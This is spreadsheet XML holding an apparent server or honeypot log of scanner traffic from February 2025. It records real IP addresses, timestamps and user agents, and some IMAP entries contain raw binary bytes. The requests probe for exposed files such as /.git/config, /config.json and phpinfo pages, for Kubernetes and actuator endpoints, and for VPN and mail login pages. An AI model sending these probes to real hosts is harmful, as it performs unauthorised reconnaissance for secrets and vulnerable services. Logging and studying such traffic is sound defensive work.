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User-Agent</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default" office:value-type="string" calcext:value-type="string">
            <text:p>Horoda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7.94.146.62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19T08:12:10" calcext:value-type="date">
            <text:p>2025-02-19 08:12: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7.94.146.6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19T08:12:14" calcext:value-type="date">
            <text:p>2025-02-19 08:12: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7.94.146.62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19T08:12:15" calcext:value-type="date">
            <text:p>2025-02-19 08:12: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7.94.146.62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19T08:12:16" calcext:value-type="date">
            <text:p>2025-02-19 08:12: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4.218.164.19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AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:07" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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4.218.164.192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Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:08" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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4.218.164.192</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /robots.txt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:09" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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4.218.164.192</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /sitemap.xml</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:10" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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4.218.164.192</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /config.json</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:11" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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4.218.164.19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32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:32:14" calcext:value-type="date">
            <text:p>2025-02-19 08:32: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5.148.10.186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Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T08:35:40" calcext:value-type="date">
            <text:p>2025-02-19 08:35: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65.227.45.87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19T09:05:58" calcext:value-type="date">
            <text:p>2025-02-19 09:05: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5.156.129.13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60.0.3112.113 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T09:18:03" calcext:value-type="date">
            <text:p>2025-02-19 09:18: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91.84.98.131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python-httpx/0.28.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T09:20:02" calcext:value-type="date">
            <text:p>2025-02-19 09:20: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1.84.98.131</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>POST /</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>python-httpx/0.28.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T09:20:03" calcext:value-type="date">
            <text:p>2025-02-19 09:20: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99.45.155.100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19T10:15:29" calcext:value-type="date">
            <text:p>2025-02-19 10:15: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99.45.155.100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19T10:15:29" calcext:value-type="date">
            <text:p>2025-02-19 10:15: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2.142.125.12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19T10:45:03" calcext:value-type="date">
            <text:p>2025-02-19 10:45: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62.142.125.126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19T10:45:15" calcext:value-type="date">
            <text:p>2025-02-19 10:45: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2.142.125.126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19T10:45:17" calcext:value-type="date">
            <text:p>2025-02-19 10:45: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88.0.4324.190 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T11:36:04" calcext:value-type="date">
            <text:p>2025-02-19 11:36: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3.91.164.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19T11:43:58" calcext:value-type="date">
            <text:p>2025-02-19 11:43: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13.32.25.76</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/service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19T13:22:47" calcext:value-type="date">
            <text:p>2025-02-19 13:22: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14.33.111.13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19T13:23:25" calcext:value-type="date">
            <text:p>2025-02-19 13:23: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98.235.24.14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68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T13:40:49" calcext:value-type="date">
            <text:p>2025-02-19 13:40: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4.112.74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22.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T14:28:33" calcext:value-type="date">
            <text:p>2025-02-19 14:28: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47.185.132.23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19T14:43:19" calcext:value-type="date">
            <text:p>2025-02-19 14:43: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12.94.253.3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19T14:59:37" calcext:value-type="date">
            <text:p>2025-02-19 14:59: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12.94.253.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a01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19T14:59:37" calcext:value-type="date">
            <text:p>2025-02-19 14:59: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19T15:14:14" calcext:value-type="date">
            <text:p>2025-02-19 15:14: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19T15:14:14" calcext:value-type="date">
            <text:p>2025-02-19 15:14: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38.68.154.198</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /squid-internal-mgr/cachemgr.cgi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19T15:27:36" calcext:value-type="date">
            <text:p>2025-02-19 15:27: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38.68.154.19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19T15:28:54" calcext:value-type="date">
            <text:p>2025-02-19 15:28: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38.68.154.198</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1</text:p>
            <text:p>Host: 15.235.199.137:143</text:p>
            <text:p>User-Agent: Mozilla/5.0 zgrab/0.x</text:p>
            <text:p>Accept: */*</text:p>
            <text:p>Accept-Encoding: gzip</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T15:28:54" calcext:value-type="date">
            <text:p>2025-02-19 15:28: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85.93.89.126</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /remote/login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T15:31:20" calcext:value-type="date">
            <text:p>2025-02-19 15:31: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85.93.89.126</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T15:31:21" calcext:value-type="date">
            <text:p>2025-02-19 15:31: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13.32.25.76</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/service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19T15:43:30" calcext:value-type="date">
            <text:p>2025-02-19 15:43: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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T15:59:41" calcext:value-type="date">
            <text:p>2025-02-19 15:59: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92.255.57.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78.0.3904.108 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:03:37" calcext:value-type="date">
            <text:p>2025-02-19 16:03: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98.74.55.218</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>python-urllib3/2.2.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:14:20" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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65.22.154.8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14:21" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.74.56.140</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /RDWeb/Pages/en-US/login.aspx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14:21" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.74.55.218</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /api/v1/pods</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>python-urllib3/2.2.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:14:23" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.74.56.14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14:23" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.211.97.130</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>POST /wsman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14:23" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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67.172.201.5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3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:14:23" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.74.56.140</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /Remote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14:26" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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98.74.56.140</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /RDWeb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14:30" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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5.33.20.1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83.0.4103.61 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:14:40" calcext:value-type="date">
            <text:p>2025-02-19 16:14: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.116.60.81</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/auth/errorFE.aspx?httpCode=500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17:30" calcext:value-type="date">
            <text:p>2025-02-19 16:17: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0.116.60.81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17:34" calcext:value-type="date">
            <text:p>2025-02-19 16:17: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50.116.60.81</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/auth/logon.aspx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17:37" calcext:value-type="date">
            <text:p>2025-02-19 16:17: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5.79.195.152</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /dana-na/nc/nc_gina_ver.txt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24:16" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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5.79.195.152</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /dana-cached/hc/HostCheckerInstaller.osx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24:16" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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8.183.139.165</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /auth1.html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24:45" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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68.183.139.165</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /sslvpnLogin.html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24:45" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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8.183.139.165</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /api/sonicos/auth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24:46" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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8.183.139.165</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /api/sonicos/tfa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24:46" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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68.183.139.16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24:47" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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68.183.139.165</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /auth.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T16:24:47" calcext:value-type="date">
            <text:p>2025-02-19 16:24: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57.245.231.12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19T16:27:15" calcext:value-type="date">
            <text:p>2025-02-19 16:27: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5.203.210.128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19T17:04:16" calcext:value-type="date">
            <text:p>2025-02-19 17:04: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47.185.133.173</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa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19T17:04:19" calcext:value-type="date">
            <text:p>2025-02-19 17:04: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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T17:06:14" calcext:value-type="date">
            <text:p>2025-02-19 17:06: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62.216.150.82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19T17:14:08" calcext:value-type="date">
            <text:p>2025-02-19 17:14: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5.195.37.18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32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T17:15:46" calcext:value-type="date">
            <text:p>2025-02-19 17:15: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92.255.57.58</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /actuator/gateway/routes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T17:28:13" calcext:value-type="date">
            <text:p>2025-02-19 17:28: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5.210.31.16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Xpanse, a Palo Alto Networks company, indexes customer network perimeters. If you have any questions or concerns, please reach out to: scaninfo@paloaltonetworks.com.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T17:42:07" calcext:value-type="date">
            <text:p>2025-02-19 17:42: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03.45.246.23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19T17:44:39" calcext:value-type="date">
            <text:p>2025-02-19 17:44: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03.45.246.23</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] uq�YH5VԦ�+�UùԈZ��32&lt;����/�+����<text:tab/>��</text:p>
            <text:p>/5�</text:p>
            <text:p>.</text:p>
            <text:p/>
            <text:p/>
            <text:p>�</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T17:44:39" calcext:value-type="date">
            <text:p>2025-02-19 17:44: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03.45.246.23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19T17:44:39" calcext:value-type="date">
            <text:p>2025-02-19 17:44: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4.62.197.217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19T18:18:36" calcext:value-type="date">
            <text:p>2025-02-19 18:18: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64.62.197.226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19T18:18:48" calcext:value-type="date">
            <text:p>2025-02-19 18:18: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64.62.197.226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19T18:18:48" calcext:value-type="date">
            <text:p>2025-02-19 18:18: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64.62.197.221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19T18:18:59" calcext:value-type="date">
            <text:p>2025-02-19 18:18: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4.62.197.221</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] {w�/*�ij�P4Nk�e�j�f�</text:p>
            <text:p>                                                 �'����+/�Y��/�+����<text:tab/>��</text:p>
            <text:p>/5�</text:p>
            <text:p>4</text:p>
            <text:p/>
            <text:p>�</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T18:18:59" calcext:value-type="date">
            <text:p>2025-02-19 18:18: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64.62.197.221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19T18:19:00" calcext:value-type="date">
            <text:p>2025-02-19 18:19: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24.156.179.14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19T18:27:21" calcext:value-type="date">
            <text:p>2025-02-19 18:27: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03.56.60.82</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /cdn-cgi/trace</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T18:41:05" calcext:value-type="date">
            <text:p>2025-02-19 18:41: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5.148.10.186</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /.git/config</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.5 Mobile Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T19:08:07" calcext:value-type="date">
            <text:p>2025-02-19 19:08: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96.251.70.31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nook browser/1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T19:12:39" calcext:value-type="date">
            <text:p>2025-02-19 19:12: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41.94.145.64</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /_profiler/phpinfo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/74.0.3729.155 Mobile/15E148 Safari/605.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T20:44:23" calcext:value-type="date">
            <text:p>2025-02-19 20:44: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67.94.146.5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19T20:49:00" calcext:value-type="date">
            <text:p>2025-02-19 20:49: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67.94.146.56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19T20:49:01" calcext:value-type="date">
            <text:p>2025-02-19 20:49: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67.94.146.56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19T20:49:05" calcext:value-type="date">
            <text:p>2025-02-19 20:49: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3.249.36.11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ModatScanner/1.0; +https://modat.io/)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T20:59:20" calcext:value-type="date">
            <text:p>2025-02-19 20:59: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80.94.93.24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32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T21:02:34" calcext:value-type="date">
            <text:p>2025-02-19 21:02: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25.229.4.8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19T21:19:33" calcext:value-type="date">
            <text:p>2025-02-19 21:19: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8.235.24.22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19T22:07:38" calcext:value-type="date">
            <text:p>2025-02-19 22:07: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4.156.227.75</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>POST /global-protect/login.esp</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:13:26" calcext:value-type="date">
            <text:p>2025-02-19 22:13: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4.156.227.75</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /RDWeb/Pages/en-US/default.aspx</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:22:27" calcext:value-type="date">
            <text:p>2025-02-19 22:22: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45.156.129.5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60.0.3112.113 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:29:47" calcext:value-type="date">
            <text:p>2025-02-19 22:29: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87.236.176.107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19T22:31:45" calcext:value-type="date">
            <text:p>2025-02-19 22:31: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7.236.176.107</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001 ID NIL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:31:47" calcext:value-type="date">
            <text:p>2025-02-19 22:31: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7.236.176.107</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a002 AUTHENTICATE NTLM</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:31:49" calcext:value-type="date">
            <text:p>2025-02-19 22:31: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87.236.176.107</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a003 LOGOUT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:31:51" calcext:value-type="date">
            <text:p>2025-02-19 22:31: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59.203.101.7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19T22:36:57" calcext:value-type="date">
            <text:p>2025-02-19 22:36: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96.251.66.193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Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T22:41:55" calcext:value-type="date">
            <text:p>2025-02-19 22:41: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88.0.4324.190 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-19T23:37:31" calcext:value-type="date">
            <text:p>2025-02-19 23:37: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39.162.116.22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19T23:57:06" calcext:value-type="date">
            <text:p>2025-02-19 23:57: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39.162.116.22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19T23:57:06" calcext:value-type="date">
            <text:p>2025-02-19 23:57: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04.140.148.78</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>https://gdnplus.com:Gather Analyze Provide.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:02:39" calcext:value-type="date">
            <text:p>2025-02-20 00:02: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04.140.148.78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https://gdnplus.com:Gather Analyze Provide.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:02:39" calcext:value-type="date">
            <text:p>2025-02-20 00:02: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98.235.24.156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0T00:04:29" calcext:value-type="date">
            <text:p>2025-02-20 00:04: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5.210.31.15</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa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0T00:04:31" calcext:value-type="date">
            <text:p>2025-02-20 00:04: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20.134.19.21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20T00:11:11" calcext:value-type="date">
            <text:p>2025-02-20 00:11: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0T00:20:34" calcext:value-type="date">
            <text:p>2025-02-20 00:20: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0T00:20:35" calcext:value-type="date">
            <text:p>2025-02-20 00:20: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65.154.129.22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29.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:27:55" calcext:value-type="date">
            <text:p>2025-02-20 00:27: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52.32.213.6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X11; Linux x86_64) AppleWebKit/556.46 (KHTML, like Gecko) Chrome/95.0.434 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:28:19" calcext:value-type="date">
            <text:p>2025-02-20 00:28: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52.32.213.6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Go-http-client/1.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:28:19" calcext:value-type="date">
            <text:p>2025-02-20 00:28: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52.32.213.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /robots.txt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Go-http-client/1.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:28:19" calcext:value-type="date">
            <text:p>2025-02-20 00:28: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52.32.213.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /sitemap.xml</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Go-http-client/1.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:28:19" calcext:value-type="date">
            <text:p>2025-02-20 00:28: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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:35:24" calcext:value-type="date">
            <text:p>2025-02-20 00:35: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45.156.129.131</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /xmldata?item=all</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T00:41:21" calcext:value-type="date">
            <text:p>2025-02-20 00:41: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47.182.213.24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0T01:00:54" calcext:value-type="date">
            <text:p>2025-02-20 01:00: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67.94.145.10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01:14:15" calcext:value-type="date">
            <text:p>2025-02-20 01:14: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67.94.145.108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0T01:14:15" calcext:value-type="date">
            <text:p>2025-02-20 01:14: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45.156.130.4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60.0.3112.113 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T01:20:39" calcext:value-type="date">
            <text:p>2025-02-20 01:20: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5.79.181.104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02:18:27" calcext:value-type="date">
            <text:p>2025-02-20 02:18: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5.79.181.104</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] </text:p>
            <text:p>��!���ƚU</text:p>
            <text:p>&amp;B�b���s_�:o�a֞ ���V�uK?��`�_`�z}���&amp;�,P�K|�&lt;�+�/�,�0̨̩�<text:tab/>��</text:p>
            <text:p>���/5�</text:p>
            <text:p>�$�(�#�'&lt;=���</text:p>
            <text:p/>
            <text:p/>
            <text:p>�+</text:p>
            <text:p/>
            <text:p>3&amp;$ ?MHǪ^��P�z�zH���~.}�����cl�ea</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T02:18:27" calcext:value-type="date">
            <text:p>2025-02-20 02:18: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45.79.181.104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02:18:28" calcext:value-type="date">
            <text:p>2025-02-20 02:18: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45.79.181.104</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] </text:p>
            <text:p>�I ?��-���)$J�)(�NԟP^�e"K)�c��P�&lt;�+�/�,�0̨̩�<text:tab/>��</text:p>
            <text:p>���/5�</text:p>
            <text:p>�$�(�#�'&lt;=���</text:p>
            <text:p/>
            <text:p/>
            <text:p>�+</text:p>
            <text:p/>
            <text:p>3&amp;$ q�3í(_��</text:p>
            <text:p>            y/&gt;B7�D������Sޏ��</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T02:18:28" calcext:value-type="date">
            <text:p>2025-02-20 02:18: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20.132.183.7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20T02:26:31" calcext:value-type="date">
            <text:p>2025-02-20 02:26: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98.235.24.10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68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T02:29:42" calcext:value-type="date">
            <text:p>2025-02-20 02:29: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45.79.115.134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03:04:29" calcext:value-type="date">
            <text:p>2025-02-20 03:04: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3.71.128.11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2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-20T03:19:48" calcext:value-type="date">
            <text:p>2025-02-20 03:19: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62.216.150.12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0T03:30:08" calcext:value-type="date">
            <text:p>2025-02-20 03:30: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5.147.250.20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04:44:37" calcext:value-type="date">
            <text:p>2025-02-20 04:44:37</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>���x`��v����/�+����"[IMA��CMD] uq��l��+h����s���KZ���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/5�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�"</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
